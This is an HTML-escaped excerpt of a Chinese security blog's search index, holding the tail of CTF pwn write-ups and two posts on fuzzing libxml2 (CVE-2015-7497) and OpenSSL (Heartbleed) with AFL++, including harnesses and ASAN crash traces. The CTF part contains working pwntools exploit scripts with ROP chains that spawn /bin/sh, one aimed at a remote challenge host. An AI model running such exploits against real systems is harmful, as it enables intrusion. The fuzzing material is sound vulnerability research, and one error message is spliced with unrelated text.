    io.sendlineafter(b&amp;quot;Choose your weapon: \n&amp;quot;, b&amp;quot;3&amp;quot;)
    conf()

    io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;s&amp;quot;*0x1+b&amp;quot;heck&amp;quot;)

# bypass enemy_team check
io.sendlineafter(b&amp;quot;offs? \n&amp;quot;, b&amp;quot;y&amp;quot;)
io.sendline(b&amp;quot;heck&amp;quot;+b&amp;quot;a&amp;quot;*0x5c)
# conf()
# io.sendlineafter(b&amp;quot;leave?\n&amp;quot;, b&amp;quot;a&amp;quot;*0x64)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;das_control&#34;&gt;das_control:&lt;/h3&gt;
&lt;p&gt;vuln中溢出抛出异常,覆盖&lt;code&gt;rbp&lt;/code&gt;为&lt;code&gt;gift&lt;/code&gt;，之后打栈迁移&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

# io = process(&amp;quot;./control&amp;quot;)
io = remote(&amp;quot;node5.buuoj.cn&amp;quot;, 26788)
elf = ELF(&amp;quot;./control&amp;quot;)
libc = elf.libc

pop_rax = 0x0000000000462c27  # pop rax; ret;
syscall_ret = 0x000000000042f494  # syscall; ret;
pop_rdi = 0x0000000000401c72  # pop rdi; ret;
pop_rsi = 0x0000000000405285  # pop rsi; ret;
pop_rdx = 0x0000000000401aff  # pop rdx; ret;
read_text = 0x402221
# 0x000000000045baa3: mov rdx, qword ptr [rsi + 6]; mov qword ptr [rdi], rcx; mov qword ptr [rdi + 6], rdx; ret;
magic_gadget = 0x000000000045baa3
# vuln =

io.sendafter(b&amp;quot;Gift&amp;gt; &amp;quot;, p64(magic_gadget)+p64(read_text))

# gdb.attach(io, &#39;b *0x000000000045baa3\nset follow-fork-mode parent\n&#39;)

payload = cyclic(0x70)+p64(0x4D3348)+p64(0x04021fa+1)
io.sendafter(b&amp;quot;control?\n&amp;quot;, payload)

payload = b&amp;quot;/bin/sh\x00&amp;quot;+p64(pop_rdi)+p64(0x4d3350)+p64(pop_rdx) + \
    p64(0)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret)
io.sendafter(b&amp;quot;again&amp;quot;, payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;d3note&#34;&gt;d3note:&lt;/h3&gt;
&lt;p&gt;越界读写改got表&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;, arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])

io = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)
libc = elf.libc


def op114(c1, c2, cc):  # malloc
    io.sendline(str(0x114))
    io.sendline(str(c1))
    io.sendline(str(c2))
    io.sendline(cc)


def op514(c1):  # puts
    io.sendline(str(0x514))
    io.sendline(str(c1))


def op1919(c1):  # free
    io.sendline(str(0x1919))
    io.sendline(str(c1))


def op810(c1, cc):  # edit
    io.sendline(str(0x810))
    io.sendline(str(c1))
    io.sendline(cc)

# pause()


op114(0, 0x90, b&amp;quot;/bin/sh\x00&amp;quot;)
op1919(0)
op114(0, 0x90, b&amp;quot;/bin/sh\x00&amp;quot;)

op514(-0x39f)
leak_addr = u64(io.recv(6).ljust(8, b&#39;\x00&#39;))-libc.sym[b&amp;quot;setbuf&amp;quot;]
log.success(f&amp;quot;leak_addr: {hex(leak_addr)}&amp;quot;)

sys_addr = leak_addr + libc.sym[b&amp;quot;system&amp;quot;]

gdb.attach(io)

op114(-0xa, sys_addr &amp;amp; 0xffffffff, b&amp;quot;a&amp;quot;)
op1919(0)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">近期一些题</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/VX0_6BnfV/"" data-c="
          &lt;h2 id=&#34;libxml2&#34;&gt;libxml2：&lt;/h2&gt;
&lt;h3 id=&#34;前言&#34;&gt;前言：&lt;/h3&gt;
&lt;p&gt;本文记录afl-training的第一篇，复现&lt;code&gt;CVE-2015-7497&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;准备工作&#34;&gt;准备工作：&lt;/h3&gt;
&lt;p&gt;按照官方操作,本机下面需要设置下临时环境变量&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git submodule init &amp;amp;&amp;amp; git submodule update
cd libxml2
export CC=afl-clang-fast 
./autogen.sh 
export AFL_USE_ASAN=1 
make -j 4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们使用了&lt;code&gt;ASAN&lt;/code&gt;，即&lt;code&gt;address sanitizer&lt;/code&gt;，一个快速的内存错误检测工具，可以在内存分配失败时立即退出并打印错误信息，但有的情况下内存分配失败并不会导致程序崩溃&lt;br&gt;
为了方便后面fuzz后处理crash，我们可以开启&lt;code&gt;ASAN&lt;/code&gt;并设置临时环境变量禁用&lt;code&gt;export ASAN_OPTIONS=detect_leaks=0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不过开启&lt;code&gt;ASAN&lt;/code&gt;之后编译的测试程序&lt;code&gt;./testModule&lt;/code&gt;运行时报错&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:/home/fk/文档/fuzzing/afl-training/challenges/libxml2/libxml2# ./testModule 
[-] FATAL: forkserver is already up, but an instrumented dlopen() library loaded afterwards. You must AFL_PRELOAD such libraries to be able to fuzz them or LD_PRELOAD to run outside of afl-fuzz.
To ignore this set AFL_IGNORE_PROBLEMS=1 but this will lead to ambiguous coverage data.
In addition, you can set AFL_IGNORE_PROBLEMS_COVERAGE=1 to ignore the additional coverage instead  is going to be easy to
fuzz, is definitely exposed to user-provided input in many situations, and is at high risk of containing bugs (parsing a
complex data format in an unsafe language).

This functionality is exposed in the [parser](http://xmlsoft.org/html/libxml-parser.html) API, and whilst you could dig
through this documentation, the easiest approach is to look at an example.
[`parse1.c`](http://xmlsoft.org/examples/parse1.c) (also in the (use with caution!).
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;有人提过类似的issue &lt;a href=&#34;https://coder.social/antonio-morales/fuzzing101/issues/21&#34;&gt;https://coder.social/antonio-morales/fuzzing101/issues/21&lt;/a&gt;&lt;br&gt;
追溯到官方FAQ有两种解决方案，一种是设置临时环境变量&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export AFL_PRELOAD=foo.so
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是笔者设置之后仍然报错，且在本机检索后并未找到&lt;code&gt;foo.so&lt;/code&gt;&lt;br&gt;
(&lt;code&gt;foo.so&lt;/code&gt;其实并不是什么东西，&lt;code&gt;foo&lt;/code&gt;的本意就是无意义，得strace附加进程上看相关的动态链接库&lt;/p&gt;
&lt;p&gt;第二种设置临时环境变量忽略后测试成功&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export AFL_IGNORE_PROBLEMS=1 
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;编写harness&#34;&gt;编写harness：&lt;/h3&gt;
&lt;p&gt;以上我们并未生成fuzz所需的入口程序，根据官方文档所说，即是我们需要一个&lt;code&gt;fuzzing harness&lt;/code&gt;，笔者也是第一次，所以跟着官方文档的hint走了&lt;br&gt;
根据官方文档描述&lt;code&gt;libxml2&lt;/code&gt;的api很多，但是最容易进行模糊测试的是核心XML解析逻辑，因为它暴露在&lt;code&gt;用户输入&lt;/code&gt;的情况下，可能在处理不安全的复杂数据时出现bug&lt;br&gt;
根据官方给的example&lt;a href=&#34;http://xmlsoft.org/examples/parse1.c&#34;&gt;http://xmlsoft.org/examples/parse1.c&lt;/a&gt;可以自己大概改一个，从命令行读入文件名的harness&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;libxml/parser.h&amp;gt;
#include &amp;lt;libxml/tree.h&amp;gt;

int main(int argc, char **argv) {
    if (argc != 2)
        return(1);
    xmlDocPtr doc; /* the resulting document tree */

    doc = xmlReadFile(argv[1], NULL, 0);
    if (doc == NULL) {
        fprintf(stderr, &amp;quot;Failed to parse %s\n&amp;quot;, argv[1]);
	return 0;
    }
    xmlFreeDoc(doc);

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return(0);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用以下指令编译&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-clang-fast ./fuzz.c -I ./include ./.libs/libxml2.a -lz -lm -g -o fuzzer 

#-I 指定include目录和libxml2的静态链接库
#-lm使用math库，-lz使用zlib库，-g开启debug模式

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;报错&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[-] PROGRAM ABORT : Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!
         Location : check_asan_opts(), src/afl-fuzz-init.c:2651
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查询相关issue:&lt;a href=&#34;https://groups.google.com/g/afl-users/c/XaE06yzKOu8&#34;&gt;https://groups.google.com/g/afl-users/c/XaE06yzKOu8&lt;/a&gt;&lt;br&gt;
再次设置环境变量&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export ASAN_OPTIONS=abort_on_error=1:symbolize=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以正常fuzz&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223602862.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;优化harness&#34;&gt;优化harness：&lt;/h3&gt;
&lt;p&gt;但是太慢了，我们根据afl++文档可以添加一点优化&lt;br&gt;
注意不必要语句的删除，下面是失败示例&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;libxml/parser.h&amp;gt;
#include &amp;lt;libxml/tree.h&amp;gt;

int main(int argc, char **argv) {
    if (argc != 2)
        return(1);
    xmlDocPtr doc; /* the resulting document tree */
    #ifndef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif
    while(__AFL_LOOP(1000)){
    doc = xmlReadFile(argv[1], NULL, 0);
    if (doc == NULL) {
        fprintf(stderr, &amp;quot;Failed to parse %s\n&amp;quot;, argv[1]);
	return 0;
    }
    xmlFreeDoc(doc);
    }

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return(0);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功示例，注意两者区别：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;libxml/parser.h&amp;gt;
#include &amp;lt;libxml/tree.h&amp;gt;

int main(int argc, char **argv)
{
    if (argc != 2)
        return (1);
    xmlDocPtr doc; /* the resulting document tree */
    #ifndef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif
    while (__AFL_LOOP(1000))
    {
        doc = xmlReadFile(argv[1], NULL, 0);
        if (doc != NULL)
        {
            xmlFreeDoc(doc);
        }
    }

    /*
     * Cleanup function for the XML library.
     */
    xmlCleanupParser();
    return (0);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后效率提升最高30x&lt;/p&gt;
&lt;h3 id=&#34;crash分析&#34;&gt;crash分析：&lt;/h3&gt;
&lt;p&gt;4个小时8个unique crash&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223609962.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;afl-tmin&lt;/code&gt;精简input:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for i in id*; do afl-tmin -i $i -o ./tmp/$i -m none -- ./fuzzer @@; done;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;../fuzzer 输入文件&lt;/code&gt;查看报错信息，发现有几个输入文件错误发生在&lt;code&gt;parser.c&lt;/code&gt;的第10666行，即错误发生在宏&lt;code&gt;MOVETO_ENDTAG();&lt;/code&gt;中，并不是我们想要复现的&lt;code&gt;xmlDictComputeFastQKey&lt;/code&gt;函数&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223617986.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
使用gdb调试跟进确认错误出现在宏定义处，并不是我们想要复现的错误&lt;/p&gt;
&lt;p&gt;好在有一个输入样本能触发CVE中的错误&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/文档/fuzzing/afl-training/challenges/libxml2/libxml2/opt/default/crashes/tmp$ hexdump -C id\:000002\,sig\:06\,src\:002889\,time\:8672911\,execs\:11122815\,op\:havoc\,rep\:16 
00000000  3c 4a 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |&amp;lt;J00000000000000|
00000010  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000350  30 30 3a 4a 30 30 30 30  30 30 30 30 30 30 30 30  |00:J000000000000|
00000360  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
000003b0  30 30 30 30 30 30 30 30  30 30                    |0000000000|
000003ba
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即&lt;code&gt;xmlDictComputeFastQKey&lt;/code&gt;函数中的溢出&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;=================================================================
==3397754==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62100000123c at pc 0x556c7cb6c531 bp 0x7ffe76acfde0 sp 0x7ffe76acfdd8
READ of size 1 at 0x62100000123c thread T0
    #0 0x556c7cb6c530 in xmlDictComputeFastQKey /home/fk/文档/fuzzing/afl-training/challenges/libxml2/libxml2/dict.c:489:18
    #1 0x556c7cb6a16f in xmlDictQLookup /home/fk/文档/fuzzing/afl-training/challenges/libxml2/libxml2/dict.c:1093:12
    #2 0x556c7cb79590 in xmlSAX2StartElementNs /home/fk/文档/fuzzing/afl-training/challenges/libxml2/libxml2/SAX2.c:2238:17
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;binary ninja查看调用&lt;code&gt;xmlDictComputeFastQKey&lt;/code&gt;函数的偏移&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696223625979.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
gdb断点打过去:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdb --args ../fuzzer id\:000002\,sig\:06\,src\:002889\,time\:8672911\,execs\:11122815\,op\:havoc\,rep\:16 

b *$rebase(0x03de16b)

c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以得到相关寄存器值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; ► 0x55555593216b &amp;lt;xmlDictQLookup+235&amp;gt;    call   xmlDictComputeFastQKey                &amp;lt;xmlDictComputeFastQKey&amp;gt;
        rdi: 0x6190000000d7 ◂— 0x303030303030304a (&#39;J0000000&#39;)
        rsi: 0x351
        rdx: 0x621000001528 ◂— &#39;J000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#39;
        rcx: 0x67
        r8: 0x2e70efeb

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据&lt;code&gt;dict.c&lt;/code&gt;中函数传参规则，plen对应&lt;code&gt;$rsi&lt;/code&gt;，len对应&lt;code&gt;$rcx&lt;/code&gt;&lt;br&gt;
&lt;code&gt;len-(plen+1+1)&lt;/code&gt;即&lt;code&gt;0x67-(0x351+0x1+0x1)=-0x2EC&lt;/code&gt;&lt;br&gt;
下标负数,数组越界&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static unsigned long
xmlDictComputeFastQKey(const xmlChar *prefix, int plen,
                       const xmlChar *name, int len, int seed)
{
    unsigned long value = (unsigned long) seed;

    if (plen == 0)
	value += 30 * (unsigned long) &#39;:&#39;;
    else
	value += 30 * (*prefix);

    if (len &amp;gt; 10) {
        value += name[len - (plen + 1 + 1)];
        len = 10;
	if (plen &amp;gt; 10)
	    plen = 10;
    }
    switch (plen) {
        case 10: value += prefix[9];
        case 9: value += prefix[8];
        case 8: value += prefix[7];
        case 7: value += prefix[6];
        case 6: value += prefix[5];
        case 5: value += prefix[4];
        case 4: value += prefix[3];
        case 3: value += prefix[2];
        case 2: value += prefix[1];
        case 1: value += prefix[0];
        default: break;
    }
    len -= plen;
    if (len &amp;gt; 0) {
        value += (unsigned long) &#39;:&#39;;
	len--;
    }
    switch (len) {
        case 10: value += name[9];
        case 9: value += name[8];
        case 8: value += name[7];
        case 7: value += name[6];
        case 6: value += name[5];
        case 5: value += name[4];
        case 4: value += name[3];
        case 3: value += name[2];
        case 2: value += name[1];
        case 1: value += name[0];
        default: break;
    }
    return(value);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;heartbleed&#34;&gt;heartbleed:&lt;/h2&gt;
&lt;h3 id=&#34;前言-2&#34;&gt;前言：&lt;/h3&gt;
&lt;p&gt;本文记录afl-training的第二篇，复现心脏滴血漏洞&lt;/p&gt;
&lt;h3 id=&#34;准备工作-2&#34;&gt;准备工作：&lt;/h3&gt;
&lt;p&gt;设置环境变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export CC=afl-clang-fast CXX=afl-clang-fast++ AFL_USE_ASAN=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./config -d
make
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在原来的&lt;code&gt;handshake.cc&lt;/code&gt;上作修改，在&lt;code&gt;BIO_write&lt;/code&gt;前初始化&lt;code&gt;size&lt;/code&gt;和&lt;code&gt;data&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;// Copyright 2016 Google Inc. All Rights Reserved.
// Licensed under the Apache License, Version 2.0 (the &amp;quot;License&amp;quot;);
#include &amp;lt;openssl/ssl.h&amp;gt;
#include &amp;lt;openssl/err.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;stdint.h&amp;gt;
#include &amp;lt;stddef.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

#ifndef CERT_PATH
# define CERT_PATH
#endif

SSL_CTX *Init() {
  SSL_library_init();
  SSL_load_error_strings();
  ERR_load_BIO_strings();
  OpenSSL_add_all_algorithms();
  SSL_CTX *sctx;
  assert (sctx = SSL_CTX_new(TLSv1_method()));
  /* These two file were created with this command:
      openssl req -x509 -newkey rsa:512 -keyout server.key \
     -out server.pem -days 9999 -nodes -subj /CN=a/
  */
  assert(SSL_CTX_use_certificate_file(sctx, &amp;quot;server.pem&amp;quot;,
                                      SSL_FILETYPE_PEM));
  assert(SSL_CTX_use_PrivateKey_file(sctx, &amp;quot;server.key&amp;quot;,
                                     SSL_FILETYPE_PEM));
  return sctx;
}

int main() {
  static SSL_CTX *sctx = Init();
  SSL *server = SSL_new(sctx);
  BIO *sinbio = BIO_new(BIO_s_mem());
  BIO *soutbio = BIO_new(BIO_s_mem());
  SSL_set_bio(server, sinbio, soutbio);
  SSL_set_accept_state(server);

  /* TODO: To spoof one end of the handshake, we need to write data to sinbio
   * here */
  #ifdef __AFL_HAVE_MANUAL_CONTROL
    __AFL_INIT();
  #endif
  uint8_t data[100] = {0};
  size_t size = read(STDIN_FILENO, data, 100);
  if (size == -1) {
    printf(&amp;quot;Failed to read from stdin\n&amp;quot;);
    return(-1);
  }
  BIO_write(sinbio, data, size);

  SSL_do_handshake(server);
  SSL_free(server);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;编译：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-clang-fast++ ./handshake.cc -I ./include ./libssl.a ./libcrypto.a -ldl -g -o handshake
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;fuzzing&#34;&gt;Fuzzing:&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ipt&lt;/code&gt;中生成随机种子：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd ipt &amp;amp;&amp;amp; dd if=/dev/urandom of=1.in bs=64 count=10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;开始fuzz前注意将&lt;code&gt;server.key server.pem&lt;/code&gt;放在和&lt;code&gt;handshake&lt;/code&gt;同目录下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-fuzz -i ipt/ -o opt/ -m none ./handshake
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1696483359558.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;crash分析-2&#34;&gt;crash分析：&lt;/h3&gt;
&lt;p&gt;将&lt;code&gt;handshake&lt;/code&gt;移至&lt;code&gt;crashes&lt;/code&gt;目录下使用&lt;code&gt;afl-tmin&lt;/code&gt;简化&lt;code&gt;input&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for i in id*;do afl-tmin -i $i -o ./tmp/$i  -- ./handshake;done;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;之后使用简化后的&lt;code&gt;input&lt;/code&gt;测试&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp$ gdb handshake 
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type &amp;quot;show copying&amp;quot; and &amp;quot;show warranty&amp;quot; for details.
This GDB was configured as &amp;quot;x86_64-linux-gnu&amp;quot;.
Type &amp;quot;show configuration&amp;quot; for configuration details.
For bug reporting instructions, please see:
&amp;lt;https://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
    &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.

For help, type &amp;quot;help&amp;quot;.
Type &amp;quot;apropos word&amp;quot; to search for commands related to &amp;quot;word&amp;quot;...
pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from handshake...
------- tip of the day (disable with set show-tips off) -------
Disable Pwndbg context information display with set context-sections &#39;&#39;
pwndbg&amp;gt; ls
handshake									 id:000006,sig:06,src:000236,time:22339456,execs:17321069,op:havoc,rep:7
id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1		 id:000007,sig:06,src:000233,time:23634783,execs:18301688,op:havoc,rep:3
id:000001,sig:06,src:000024+000075,time:4119745,execs:3210038,op:splice,rep:17	 id:000008,sig:06,src:000294+000226,time:25859527,execs:19982226,op:splice,rep:2
id:000002,sig:06,src:000053+000041,time:5079793,execs:3956550,op:splice,rep:4	 id:000009,sig:06,src:000270,time:26541712,execs:20500629,op:havoc,rep:1
id:000003,sig:06,src:000024+000068,time:10115665,execs:7871015,op:splice,rep:12  server.key
id:000004,sig:06,src:000040+000006,time:16647584,execs:12944780,op:splice,rep:4  server.pem
id:000005,sig:06,src:000224,time:22158868,execs:17184882,op:havoc,rep:4
This command is deprecated in Pwndbg. Please use the GDB&#39;s built-in syntax for running shell commands instead: !ls &amp;lt;args&amp;gt;
pwndbg&amp;gt; run &amp;lt; id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1
Starting program: /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake &amp;lt; id:000000,sig:06,src:000031,time:54840,execs:42018,op:havoc,rep:1
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
=================================================================
==7701==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x5555556f96d7 bp 0x7fffffffd4d0 sp 0x7fffffffcca0
READ of size 25648 at 0x629000009748 thread T0
[Attaching after Thread 0x7ffff7e99800 (LWP 7701) fork to child process 7704]
[New inferior 2 (process 7704)]
[Detaching after fork from parent process 7701]
[Inferior 1 (process 7701) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
process 7704 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
    #0 0x5555556f96d6 in __asan_memcpy (/home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a56d6) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)
    #1 0x555555744ca1 in tls1_process_heartbeat /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/t1_lib.c:2586:3
    #2 0x5555557b9129 in ssl3_read_bytes /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_pkt.c:1092:4
    #3 0x5555557bdcd9 in ssl3_get_message /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_both.c:457:7
    #4 0x555555786696 in ssl3_get_client_hello /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_srvr.c:941:4
    #5 0x5555557823ec in ssl3_accept /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/s3_srvr.c:357:9
    #6 0x555555737a7f in main /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/./handshake.cc:53:3
    #7 0x7ffff7829d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #8 0x7ffff7829e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #9 0x555555677564 in _start (/home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x123564) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)

0x629000009748 is located 0 bytes to the right of 17736-byte region [0x629000005200,0x629000009748)
allocated by thread T0 here:
    #0 0x5555556fa3ae in malloc (/home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a63ae) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641)
    #1 0x5555557f0ee9 in CRYPTO_malloc /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/crypto/mem.c:308:8

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/opt/default/crashes/tmp/handshake+0x1a56d6) (BuildId: 2eb1559a07e34eae87f86fae3812f29a9b98a641) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c527fff9290: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c527fff92d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=&amp;gt;0x0c527fff92e0: 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa
  0x0c527fff92f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c527fff9330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7701==ABORTING
[Inferior 2 (process 7704) exited normally]
&lt;/code&gt;&lt;/pre&gt;
